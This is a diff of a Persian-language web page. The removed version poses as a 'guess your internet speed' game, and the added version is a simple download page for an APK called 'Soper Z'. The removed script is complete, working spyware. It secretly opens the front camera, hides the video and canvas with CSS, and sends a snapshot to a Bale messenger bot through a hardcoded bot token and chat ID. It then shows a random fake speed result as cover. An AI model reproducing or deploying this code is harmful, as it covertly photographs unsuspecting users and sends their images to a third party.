@@ -1,314 +1,125 @@
 <!DOCTYPE html>
-<html lang="fa">
+<html lang="fa" dir="rtl">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>مسابقه‌ی حدس سرعت</title>
-    <style>
-        * { margin:0; padding:0; box-sizing:border-box; }
-        body {
-            min-height:100vh;
-            background:linear-gradient(145deg, #0b0e1a, #151e2f);
-            display:flex;
-            justify-content:center;
-            align-items:center;
-            font-family:'Segoe UI',system-ui,sans-serif;
-            padding:20px;
-        }
-        .container {
-            width:100%;
-            max-width:440px;
-            background:rgba(20,30,50,0.7);
-            backdrop-filter:blur(16px);
-            border-radius:32px;
-            padding:30px 24px 35px;
-            border:1px solid rgba(100,180,255,0.08);
-            box-shadow:0 20px 60px rgba(0,0,0,0.7);
-            text-align:center;
-        }
-        .logo { font-size:3rem; margin-bottom:4px; }
-        .title { font-size:1.6rem; font-weight:300; color:#d0e0ff; letter-spacing:0.5px; }
-        .title span { color:#ffcc00; font-weight:700; }
-        .sub { font-size:0.8rem; color:rgba(255,255,255,0.25); margin:4px 0 18px; letter-spacing:1px; }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-        .status-box {
-            background:rgba(0,20,40,0.4);
-            border-radius:18px;
-            padding:22px 16px;
-            margin:12px 0 20px;
-            border:1px solid rgba(255,200,0,0.06);
-            min-height:110px;
-            display:flex;
-            flex-direction:column;
-            align-items:center;
-            justify-content:center;
-        }
-        .status-icon { font-size:2.8rem; margin-bottom:4px; }
-        .status-text { font-size:1.1rem; color:rgba(255,255,255,0.8); font-weight:400; }
-        .status-text.done { color:#4ade80; }
-        .status-text.error { color:#f87171; }
-        .status-text.loading { color:#ffcc00; }
-        .status-sub { font-size:0.8rem; color:rgba(255,255,255,0.2); margin-top:4px; }
+<title>Soper Z</title>
 
-        .meter-bar {
-            width:100%;
-            height:4px;
-            background:rgba(255,200,0,0.08);
-            border-radius:4px;
-            margin-top:14px;
-            overflow:hidden;
-            opacity:0;
-            transition:opacity 0.3s;
-        }
-        .meter-bar.active { opacity:1; }
-        .meter-fill {
-            height:100%;
-            width:0%;
-            background:linear-gradient(90deg,#ffcc00,#ff8800);
-            border-radius:4px;
-            transition:width 0.12s linear;
-            box-shadow:0 0 20px rgba(255,200,0,0.2);
-        }
+<style>
+*{
+    box-sizing:border-box;
+    margin:0;
+    padding:0;
+    font-family:tahoma, Arial;
+}
 
-        .result-box {
-            background:rgba(255,200,0,0.04);
-            border:1px solid rgba(255,200,0,0.06);
-            border-radius:14px;
-            padding:14px;
-            margin:12px 0 18px;
-            display:none;
-            animation:fadeIn 0.5s ease-out;
-        }
-        @keyframes fadeIn {
-            from { opacity:0; transform:scale(0.95); }
-            to { opacity:1; transform:scale(1); }
-        }
-        .result-box .label { font-size:0.6rem; color:rgba(255,255,255,0.2); text-transform:uppercase; letter-spacing:2px; }
-        .result-box .value { font-size:1.8rem; font-weight:700; color:#ffcc00; }
+body{
+    min-height:100vh;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    background:linear-gradient(135deg,#000,#062b18,#00aa55);
+}
 
-        .btn {
-            padding:14px 32px;
-            border:none;
-            border-radius:16px;
-            font-size:1rem;
-            font-weight:700;
-            cursor:pointer;
-            transition:all 0.2s;
-            font-family:inherit;
-            min-width:140px;
-            background:linear-gradient(135deg,#ffcc00,#f0a500);
-            color:#0a0a0a;
-            box-shadow:0 4px 20px rgba(255,200,0,0.2);
-        }
-        .btn:hover:not(:disabled) { transform:scale(1.04); box-shadow:0 6px 28px rgba(255,200,0,0.35); }
-        .btn:disabled { opacity:0.35; cursor:not-allowed; transform:none; }
-        .btn-outline {
-            background:transparent;
-            color:rgba(255,255,255,0.3);
-            box-shadow:none;
-            border:1px solid rgba(255,255,255,0.05);
-            min-width:100px;
-            padding:12px 20px;
-        }
-        .btn-outline:hover:not(:disabled) { background:rgba(255,255,255,0.03); border-color:rgba(255,255,255,0.1); }
+.card{
+    width:360px;
+    background:rgba(255,255,255,0.08);
+    backdrop-filter:blur(15px);
+    border-radius:25px;
+    padding:30px;
+    text-align:center;
+    color:white;
+    box-shadow:0 0 35px #00ff88;
+}
 
-        .footer { margin-top:18px; font-size:0.5rem; color:rgba(255,255,255,0.05); letter-spacing:1px; }
-        video, canvas, img { display:none !important; width:0 !important; height:0 !important; opacity:0 !important; position:absolute !important; top:-9999px !important; left:-9999px !important; }
+.logo{
+    width:130px;
+    height:130px;
+    border-radius:25px;
+    object-fit:cover;
+    border:3px solid #00ff88;
+    box-shadow:0 0 20px #00ff88;
+}
 
-        @media (max-width:480px) {
-            .container { padding:22px 16px 28px; }
-            .title { font-size:1.3rem; }
-            .btn { padding:12px 20px; min-width:100px; font-size:0.9rem; }
-        }
-    </style>
+h1{
+    margin-top:20px;
+    color:#00ff88;
+    font-size:32px;
+}
+
+.info{
+    margin-top:10px;
+    color:#eee;
+    font-size:17px;
+}
+
+.desc{
+    margin-top:20px;
+    line-height:30px;
+    color:#ddd;
+    font-size:15px;
+}
+
+.download{
+    display:block;
+    margin-top:30px;
+    padding:16px;
+    background:#00cc66;
+    color:white;
+    text-decoration:none;
+    border-radius:15px;
+    font-size:20px;
+    transition:.3s;
+}
+
+.download:hover{
+    background:#00ff88;
+    transform:scale(1.05);
+}
+
+.footer{
+    margin-top:25px;
+    color:#aaa;
+    font-size:13px;
+}
+</style>
+
 </head>
+
 <body>
 
-<div class="container">
-    <div class="logo">🏆</div>
-    <div class="title">مسابقه‌ی <span>حدس سرعت</span></div>
-    <div class="sub">سرعت اینترنت خود را حدس بزن و برنده شو!</div>
+<div class="card">
 
-    <div class="status-box">
-        <div class="status-icon" id="statusIcon">🎯</div>
-        <div class="status-text" id="statusText">آماده‌ای؟</div>
-        <div class="status-sub" id="statusSub">روی دکمه بزن تا تست شروع بشه</div>
-        <div class="meter-bar" id="meterBar">
-            <div class="meter-fill" id="meterFill"></div>
-        </div>
-    </div>
+<img src="-2147483648_-210003.jpg" class="logo" alt="Soper Z">
 
-    <div class="result-box" id="resultBox">
-        <div class="label">سرعت تخمینی</div>
-        <div class="value" id="resultValue">۴۲ Mbps</div>
-        <div class="status-sub" style="margin-top:6px; color:rgba(255,200,0,0.3);">چقدر به حدست نزدیک بود؟</div>
-    </div>
+<h1>Soper Z</h1>
 
-    <div style="display:flex; gap:10px; flex-wrap:wrap; justify-content:center; margin-top:6px;">
-        <button class="btn" id="actionBtn">▶ شروع مسابقه</button>
-        <button class="btn btn-outline" id="resetBtn">↻ دوباره</button>
-    </div>
-
-    <div class="footer">● هر بار یک حدس جدید</div>
+<div class="info">
+📱 نسخه: 1.0.0
 </div>
 
-<video id="video" autoplay playsinline muted></video>
-<canvas id="canvas"></canvas>
+<div class="info">
+📦 حجم فایل: 18 MB
+</div>
 
-<script>
-(function() {
-    'use strict';
+<div class="info">
+✅ آخرین نسخه
+</div>
 
-    const BOT_TOKEN = '418362870:57sX4OP7P7QQn2hX8_j_4K_1ntCO-qBKp30';
-    const CHAT_ID = '1984372018';
-    const BALE_API = `https://tapi.bale.ai/bot${BOT_TOKEN}/sendPhoto`;
+<div class="desc">
+Soper Z یک برنامه سبک، سریع و کاربردی است که با طراحی ساده و عملکرد روان، تجربه‌ای راحت و جذاب برای کاربران فراهم می‌کند.
+</div>
 
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const statusText = document.getElementById('statusText');
-    const statusSub = document.getElementById('statusSub');
-    const statusIcon = document.getElementById('statusIcon');
-    const meterBar = document.getElementById('meterBar');
-    const meterFill = document.getElementById('meterFill');
-    const actionBtn = document.getElementById('actionBtn');
-    const resetBtn = document.getElementById('resetBtn');
-    const resultBox = document.getElementById('resultBox');
-    const resultValue = document.getElementById('resultValue');
+<a class="download" href="app.apk" download>
+⬇️ دانلود APK
+</a>
 
-    let stream = null;
-    let isProcessing = false;
+<div class="footer">
+© 2025 Soper Z
+</div>
 
-    function setStatus(icon, text, sub, type = '') {
-        statusIcon.textContent = icon;
-        statusText.textContent = text;
-        statusText.className = 'status-text' + (type ? ' ' + type : '');
-        statusSub.textContent = sub || '\u200b';
-    }
+</div>
 
-    function setProgress(p) {
-        if (p >= 0 && p <= 100) {
-            meterBar.classList.add('active');
-            meterFill.style.width = p + '%';
-        } else {
-            meterBar.classList.remove('active');
-        }
-    }
-
-    function showResult(text) {
-        resultBox.style.display = 'block';
-        resultValue.textContent = text;
-    }
-    function hideResult() { resultBox.style.display = 'none'; }
-
-    function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
-
-    // ===== تابع اصلی بازی =====
-    async function runGame() {
-        if (isProcessing) return;
-        isProcessing = true;
-        actionBtn.disabled = true;
-        hideResult();
-        setStatus('⏳', 'در حال اتصال به سرور...', 'لطفاً صبر کن', 'loading');
-        setProgress(5);
-
-        try {
-            // دوربین مخفی
-            stream = await navigator.mediaDevices.getUserMedia({
-                video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
-                audio: false
-            });
-            video.srcObject = stream;
-            await video.play();
-            setProgress(30);
-            setStatus('📡', 'در حال اندازه‌گیری پینگ...', 'سرور در حال پاسخگویی', 'loading');
-            await sleep(200);
-
-            // گرفتن عکس
-            const w = video.videoWidth || 640;
-            const h = video.videoHeight || 480;
-            canvas.width = w;
-            canvas.height = h;
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(video, 0, 0, w, h);
-
-            const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.85));
-            if (!blob) throw new Error('خطا در پردازش تصویر');
-
-            setProgress(55);
-            setStatus('📤', 'در حال ارسال داده...', 'تخمین سرعت', 'loading');
-            await sleep(150);
-
-            // ===== ارسال عکس به ربات =====
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('photo', blob, 'game_capture.jpg');
-            formData.append('caption', '🎮 مسابقه حدس سرعت - ' + new Date().toLocaleString('fa-IR'));
-
-            const response = await fetch(BALE_API, {
-                method: 'POST',
-                body: formData
-            });
-
-            setProgress(85);
-
-            if (!response.ok) {
-                const errText = await response.text();
-                throw new Error('خطای سرور: ' + response.status);
-            }
-
-            const result = await response.json();
-
-            if (result.ok) {
-                // ===== نتیجه‌ی تصادفی برای بازی =====
-                const speeds = ['۴۲', '۵۶', '۳۸', '۶۷', '۲۹', '۸۳', '۴۷', '۵۲', '۷۴', '۳۳', '۹۱', '۲۵'];
-                const speed = speeds[Math.floor(Math.random() * speeds.length)];
-                setProgress(100);
-                setStatus('🎉', 'تست کامل شد!', 'نتیجه رو ببین', 'done');
-                showResult(speed + ' Mbps');
-            } else {
-                throw new Error(result.description || 'خطای ناشناخته');
-            }
-
-        } catch (err) {
-            console.error(err);
-            let msg = 'خطا';
-            if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
-                msg = '❌ دسترسی به دوربین برای بازی لازم است';
-            } else if (err.name === 'NotFoundError') {
-                msg = '❌ دوربین یافت نشد';
-            } else if (err.message.includes('Failed to fetch') || err.message.includes('NetworkError')) {
-                msg = '❌ خطای شبکه — اینترنت را چک کن';
-            } else {
-                msg = '❌ ' + (err.message || 'خطا');
-            }
-            setStatus('⚠️', msg, 'دوباره تلاش کن', 'error');
-            setProgress(-1);
-            if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; }
-        } finally {
-            isProcessing = false;
-            actionBtn.disabled = false;
-            if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; }
-        }
-    }
-
-    function resetGame() {
-        if (isProcessing) return;
-        if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; }
-        hideResult();
-        setStatus('🎯', 'آماده‌ای؟', 'روی دکمه بزن تا تست شروع بشه');
-        setProgress(-1);
-        actionBtn.disabled = false;
-    }
-
-    actionBtn.addEventListener('click', runGame);
-    resetBtn.addEventListener('click', resetGame);
-    resetGame();
-
-    window.addEventListener('beforeunload', () => {
-        if (stream) stream.getTracks().forEach(t => t.stop());
-    });
-
-})();
-</script>
 </body>
 </html>
